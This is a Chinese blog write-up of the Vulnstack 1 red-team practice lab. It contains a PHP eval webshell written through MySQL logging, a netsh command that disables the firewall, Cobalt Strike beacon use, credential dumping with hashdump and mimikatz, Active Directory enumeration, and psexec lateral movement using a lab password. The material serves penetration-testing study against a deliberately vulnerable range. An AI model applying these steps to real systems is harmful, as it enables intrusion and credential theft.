---
title: "ATT&amp;CK实战-红日安全vulnstack(一)"
categories: ["安全技术"]
tags: ["内网", "靶机", "域渗透"]
draft: false
slug: "558"
date: "2020-04-11 09:58:00"
---

# 0x01 介绍

## ATT&CK 介绍

`ATT&CK`是

## 靶机介绍及配置

[靶机地址][1]

官方靶机说明：

> 红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟 ATT&CK 攻击链路进行搭建，开成完整闭环。后续也会搭建真实 APT 实战环境，从实战中成长。虚拟机所有统一密码：hongrisec@2019

配置网络，网络拓扑图如下：

![][2]

`vmware`网络配置如下：

![][3]

我画了个网络示意图：

![][4]

实际配置截图：

![][5]

服务器桌面如下：

![][6]

先要启动`phpstudy`：

![][7]

域控主机和`win2003`登录时要求更改密码，我更改密码把年份 2019 改为了 2020

# 0x02 渗透服务器

## 信息收集

发现主机：`netdiscover -i eth0 -r 192.168.52.0/24`：

![][8]

扫描端口：

```
nmap -sS -A -n -T4 -p- 192.168.52.143
```

![][9]

只开启了`80`和`3389`端口，访问`80`端口：

![][10]

是`phpstudy`探针，在这里可以获取到网站的绝对路径`C:/phpStudy/www/`

拉到最下面`MYSQL`数据库连接检测：

![][11]

输入弱密码`root/root`成功且可以外连：

![][12]

扫描目录，御剑只扫出了`phpmyadmin`

![][13]

使用`dirmap`扫描：

![][14]

得到备份文件`beifen.rar`，下载解压得到`yxcms`文件夹：

![][15]

看起来似乎是网站的源码，查看网页源码得到后台的账户名和密码：

![][16]

得到后台登陆的账号密码：`admin`:`123456`和登录路径`/index.php?r=admin`

## 获取 shell

登录`phpmyadmin`写`shell`(`sql`写`shell`的文章我之前写过)

先查看是否有写权限：`show variables like '%secure_file%';`

![][17]

`secure_file_priv`值为`NULL`，不能使用`into outfile`方式写入`shell`

那我们来尝试日志写`shell`，开启日志记录:`set global general_log = "ON";`

![][18]

查看当前的日志目录:`show variables like 'general%';：`

![][19]

指定日志文件：`set global general_log_file = "C:/phpStudy/www/1.php";：`

![][20]

将一句话木马写入指定的文件中

```
SELECT '<?php eval($_POST["cmd"]);?>'
```

![][21]

然后蚁剑连接：

![][22]

## 另外一种方式获取 shell

先访问一下`192.168.52.143/yxcms`，界面如下；

![][23]

访问之前解压的文件夹路径发现基本都有目录遍历漏洞：

![][24]

测试弱密码`admin/123456`登录后台：`/index.php?r=admin`

在前台模板文件中添加一句话木马连接也可获取`shell`：

![][25]

# 0x03 内网及域渗透

`webshell`反弹`shell`给`cs`，`cs`创建`Listener`，`payload`选择`beacon http`

![][26]

然后攻击 -> 生成后门 -> `Windows Executable(S)`，选择刚创建的`Listener`：

![][27]

利用蚁剑上传之前需要先执行下关掉防火墙的命令，不然在服务器端管理员可能会看到这样的提示就尴尬了：

![][28]

蚁剑终端执行

```
netsh advfirewall set allprofiles state off
```

上传后直接输入`exe`的文件名回车即可获得`cs`的`shell`：

![][29]

`cs`的使用之前我也写过文章：《CobaltStrike 基本功能与使用》

## 目标主机信息收集

拿到`shell`第一步，调低心跳值，默认心跳为`60s`，执行命令的响应很慢

我这是自己的内网且没有杀软我就设置为 0 了，真实环境不要设置这么低

进入`beacon`执行`sleep 0`，然后查看下基本的本机信息：

`whoami`、`hostname`、`net user`、`net localgroup administrators`

![][30]

众所周知`systeminfo`可以查看系统详细信息，我就不展示，提供两个小`tips`:

查看是什么操作系统&系统版本：
系统中文：`systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"`
系统英文：`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
查询系统体系架构：echo %PROCESSOR_ARCHITECTURE%

![][31]

查询已安装的软件及版本信息：`wmic product get name,version`

![][32]

在`win10`中，输入`wmic /?`会提示`wmic`已弃用，但在`server2012R2`，`win7`等版本中可以正常使用

`powershell`中可替代该命令的是`Get-WmiObject`:

```
Get-WmiObject -class win32_product | Select-Object -property name,version
```

查询进程及服务：
`tasklist`，默认显示映像名称，PID，会话名，会话，内存使用

![][33]

`tasklist /svc`，默认显示映像名称，PID，服务

![][34]

`wmic process list brief`

![][35]

常见的杀软进程：

| 进程名                  | 软件         |
| ----------------------- | ------------ |
| 360sd.exe               | 360 杀毒     |
| 360tray.exe             | 360 实时保护 |
| ZhuDongFangYu.exe       | 360 主动防御 |
| KSafeTray.exe           | 金山卫士     |
| SafeDogUpdateCenter.exe | 安全狗       |
| McAfee                  | McShield.exe |
| egui.exe                | NOD32        |
| AVP.exe                 | 卡巴斯基     |
| avguard.exe             | 小红伞       |
| bdagent.exe             | BitDefender  |

命令还有很多，单纯记下来也没有意义，还是要用到的时候立马找才印象深刻

本文重点是域渗透，就不做过多介绍了

## 域信息收集

### 什么是域

参考文章：[内网渗透学习导航][36]

> 域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行。 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。 从 Windows Server 2003 开始 ， Active Directory 是负责维护该中央数据库的 Windows 组件。Windows 域的概念与工作组的概念形成对比，在该工作组中，每台计算机都维护自己的安全主体数据库。

### 判断是否存在域

使用`ipconfig /all`查看`DNS`服务器：

![][37]

发现 DNS 服务器名为`god.org`，查看域信息：`net view`

![][38]

查看主域信息：`net view /domain`

![][39]

查看时间服务器：`net time /domain`

![][40]

发现能够执行，说明此台机器在域中(若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但该用户不是域用户)

查询当前的登录域与用户信息：`net config workstation`

![][41]

可以很清楚地看出有无域，一般只要不是`WORKGROUP`就是有域(我瞎猜的)

### 查找域控

利用`nslookup`命令直接解析域名服务器：

![][42]

得到域控的`ip`为`192.168.72.130`

### 查询域控和用户信息

查看当前域的所有用户：`net user /domain`

![][43]

获取域内用户的详细信息：`wmic useraccount get /all`

可以获取到用户名，描述信息，SID 域名等：

![][44]

查看所有域成员计算机列表：`net group "domain computers" /domain`

![][45]

查看域管理员：`net group "domain admins" /domain`

![][46]

查看域控制器：`net group "domain controllers" /domain`

![][47]

查看企业管理组：`net group "enterprise admins" /domain`

![][48]

查看域控，升级为域控时，本地账户也成为域管：

```
net localgroup administrators /domain
```

![][49]

获取域密码信息：`net accounts /domain`

![][50]

获取域信任信息(cs 里执行提示不是内部或外部命令)：`nltest /domain_trusts`

![][51]

## 横向探测

获取到一个`cs`的`beacon`后可以目标内网情况和端口开放情况

在`beacon`上右键 -> 目标 -> 选择`net view`或者`port scan`:

![][52]

选择前者执行：

![][53]

执行后可以在`Targets`选项卡看到扫描出来的主机：

![][54]

用`cs`的`hashdump`读内存密码：`hashdump`，用`mimikatz`读注册表密码：`logonpasswords`

![][55]

在凭证信息一栏可以清楚查看：

![][56]

如果权限不够可以提权，提权插件：[ElevateKit][57]

额外增加`ms14-058`、`ms15-051`、`ms16-016`、`uac-schtasks`四种提权方式

抓取密码后可以先探测内网其他主机：

`ping`方法：

```
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.72.%I | findstr "TTL="
```

![][58]

最简单的直接`arp -a`查看也可以，这里还推荐一个好用工具`Ladon`

[`Ladon`][59]作者是`k8gege`，它是一个大型内网渗透扫描器并且支持`cs`脚本形式

`cs`要使用的话只需要下载其中的`Ladon.exe`和`Ladon.cna`即可运行基本功能

详细功能参考官方[`wiki`][60]或[官方说明文档][61]

查看帮助：

![][62]

扫描网段内存活主机信息：`Ladon 192.168.72.0/24 OsScan`

![][63]

`Ladon`还有很多使用功能，比如扫描`MS17-010`：`Ladon 192.168.72.0/24 MS17010`

![][64]

其他的功能可以自己去尝试

域探测差不多了还可以使用[`BloodHound`][65]这款域渗透分析工具来分析攻击路径

BloodHound 介绍：

> BloodHound 是一种单页的 JavaScript 的 Web 应用程序，构建在 Linkurious 上，用 Electron 编译，NEO4J 数据库 PowerShell/C# ingestor.BloodHound 使用可视化图来显示 Active Directory 环境中隐藏的和相关联的主机内容。攻击者可以使用 BloodHound 轻松识别高度复杂的攻击路径，否则很难快速识别。防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入了解 Active Directory 环境中的权限关系。

## 横向移动

这里有很多种方式，可以：

1. cs 上开通 socks 通道，在攻击机上用 proxychains 将攻击机的 msf 代入内网，但是 cs 的 socks 代理不稳定
2. ew 添加转接隧道，在攻击机上用 proxychains 将攻击机的 msf 代入内网
3. cs 派生到 msf，msf 使用 socks4a 代理进内网，但是并不稳定
4. cs 派生到 msf，msf 使用使用 autoroute 添加路由进内网
5. 用 frp 创建 socks5 代理

我后面会专门写一篇文章来写各种带入方式，本篇篇幅过长，就不全部使用了

### SMB Beacon

另外这里还要介绍下`cs`派生`SMB Beacon`

> SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效

简单来说，SMB Beacon 有两种方式

第一种直接派生一个孩子，目的为了进一步盗取内网主机的 hash

新建一个`Listener`，`payload`设置为`Beacon SMB`：

![][66]

我用的是`4.0`版本，之前的`3.14`版本和这个可能会有微小差异

在已有的`Beacon上`右键`Spawn`(生成会话/派生)，选择创建的`smb beacon`的`listerner`:

![][67]

选择后会反弹一个子会话，在`external`的`ip`后面会有一个链接的小图标：

![][68]

在图标视图中：

![][69]

这就是派生的`SMB Beacon`，当前没有连接

可以在主`Beacon`上用`link host`连接它，或者 unlink host 断开它

![][70]

第二种在已有的 beacon 上创建监听，用来作为跳板进行内网穿透

前提是能够通过 shell 之类访问到内网其他主机

### psexec 使用凭证登录其他主机

前面横向探测已经获取到内网内的其他`Targets`以及读取到的凭证信息

于是可以尝试使用`psexec`模块登录其他主机

右键选择一台非域控主机`ROOT-TVI862UBEH`的`psexec`模块：

![][71]

在弹出的窗口中选择使用`god.org`的`Administrator`的凭证信息

监听器选择刚才创建的`smb beacon`，会话也选择对应的`smb beacon`的会话：

![][72]

执行后效果如下：

![][73]

可以看到分别执行了

```
rev2self
make_token GOD.ORG\Administrator hongrisec@2020
jump psexec ROOT-TVI862UBEH smb
```

这几条命令，执行后得到了`ROOT-TVI862UBEH`这台主机的`beacon`

如法炮制得到了域控主机`OWA`的`beacon`:

![][74]

最终的图标视图如图所示：

![][75]

### token 窃取

除了直接使用获取到的`hash`值，也可以直接窃取`GOD\Administrator`的`token`来登录其他主机

选择`beacon`右键 -> 目标 -> 进程列表

选择`GOD\Administrator`的`token`盗取：

![][76]

然后在选择令牌处勾选使用当前`token`即可：

![][77]

效果和前面是一样的

### cs 派生 msf 横向移动

前面`psexec`能迅速地获得域控主机的`beacon`是因为我们读取到了域管理员账号密码的`hash`

但是一般情况下，我们是获取不到的，所以多种方法都需要学会使用

`cs`和`msf`联动的话，可以使用`cs`开启`socks`，然后`msf`将代理设置为此代理进行扫描

也可以直接用`cs`派生一个`msf`的`meterpreter`会话，此处使用后者

`cs`与`msf`联动在`cs`的使用这篇文章中已经介绍过，此处不再赘述

`msf`获得`meterpreter`会话后，首先查看当前路由：`run get_local_subnets`

然后添加对应网段：`run autoroute -s 192.168.72.0/24`添加路由段

![][78]

然后去使用`ms17-010`的模块，例如：

```
auxiliary/admin/smb/ms17010command
exploit/windows/smb/ms17010psexec
```

等去攻击域内其他主机即可。

中间因为毕业设计和找工作等原因间隔了 50 天，至此本文完结。

参考文章：

- [红日安全团队官方 writeup-ATT&CK 实战 | Vulnstack 红队（一）][79]
- [Vlunstack ATT&CK 实战系列 0×1][80]
- [内网渗透实战技巧][81]
- [域渗透 VulnStack 红日红队实战系列(一)][82]
- [vulnstack ATT&CK 实战系列——红队实战（一）][83]
- [内网渗透靶机-VulnStack 1][84]
- [由浅入深的域渗透系列一（上）][85]
- [由浅入深的域渗透系列一（下）][86]
- [Cobalt Strike 系列 9][87]
- [第三节 SMB Beacon.md][88]

[1]: http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
[2]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_163813.png
[3]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_163920.png
[4]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_163931.png
[5]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_163945.png
[6]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_163958.png
[7]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164002.png
[8]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164006.png
[9]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164010.png
[10]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164014.png
[11]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164048.png
[12]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164052.png
[13]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164055.png
[14]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_091506.png
[15]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_091659.png
[16]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_092635.png
[17]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164100.png
[18]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164104.png
[19]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164108.png
[20]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164112.png
[21]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164149.png
[22]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164156.png
[23]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_195351.png
[24]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_200035.png
[25]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_093332.png
[26]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164228.png
[27]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164234.png
[28]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200411_164240.png
[29]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_144618.png
[30]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_150604.png
[31]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_151108.png
[32]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_151353.png
[33]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_152005.png
[34]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_152038.png
[35]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_152105.png
[36]: https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw
[37]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_144703.png
[38]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_152622.png
[39]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_145710.png
[40]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_144909.png
[41]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_145414.png
[42]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_145053.png
[43]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_150027.png
[44]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_152343.png
[45]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_153210.png
[46]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_153540.png
[47]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_153623.png
[48]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_153653.png
[49]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_153350.png
[50]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_153738.png
[51]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_153903.png
[52]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_101444.png
[53]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_095932.png
[54]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_100025.png
[55]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_160329.png
[56]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_160610.png
[57]: https://github.com/rsmudge/ElevateKit
[58]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_161123.png
[59]: https://github.com/k8gege/Ladon
[60]: https://github.com/k8gege/Ladon/wiki
[61]: http://k8gege.org/p/648af4b3.html
[62]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_162658.png
[63]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_163526.png
[64]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_163807.png
[65]: https://github.com/BloodHoundAD/BloodHound
[66]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_200911.png
[67]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_203406.png
[68]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_204230.png
[69]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_204506.png
[70]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200527_205350.png
[71]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_100224.png
[72]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_102559.png
[73]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_102427.png
[74]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_103504.png
[75]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_103559.png
[76]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_111222.png
[77]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_111954.png
[78]: https://img.soapffz.com/archives_img/2020/04/11/archives_20200531_110014.png
[79]: https://www.freebuf.com/column/231111.html
[80]: https://www.freebuf.com/articles/web/226497.html
[81]: https://blog.csdn.net/qq_36119192/article/details/103528138
[82]: https://zhzhdoai.github.io/2020/01/28/%E5%9F%9F%E6%B8%97%E9%80%8F-VulnStack-%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E4%B8%80/
[83]: https://www.cooyf.com/bj/vulnstack1.html
[84]: https://mp.weixin.qq.com/s/JpN3bjJ2yQhy2XxEARHrZQ
[85]: https://mp.weixin.qq.com/s/rTfizm_b_c3NRS-37n3zsA
[86]: https://mp.weixin.qq.com/s/11ImZTDTPAF19moSTynBOA
[87]: https://www.c0bra.xyz/2019/12/14/Cobalt-Strike%E7%B3%BB%E5%88%979/
[88]: https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E4%B8%89%E8%8A%82%5BSMB%20Beacon%5D.md
